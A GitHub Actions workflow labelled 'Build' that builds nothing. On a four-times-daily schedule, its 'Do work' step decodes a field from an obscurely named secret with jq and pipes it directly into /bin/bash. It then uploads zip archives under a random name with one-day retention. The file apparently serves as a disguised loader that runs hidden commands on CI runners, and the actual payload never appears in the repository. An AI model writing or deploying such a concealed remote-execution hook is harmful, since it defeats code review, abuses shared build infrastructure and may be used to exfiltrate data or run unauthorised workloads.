name: Build
on:
  workflow_dispatch:

  schedule:
    - cron: '56 2,8,14,20 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  launch:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - name: Checkout
        uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Do work
        env:
          lxi94: ${{ secrets.lxi94 }}
        run: |
          printf '%s' "$lxi94" | jq -r .zzkjc73 | /bin/bash
          echo $zhji0513 | jq -r .laf943 | /bin/bash

      - name: Archive data
        uses: actions/upload-artifact@v4
        with:
          name: Dk1p1BRb
          path: "*.zip"
          retention-days: 1
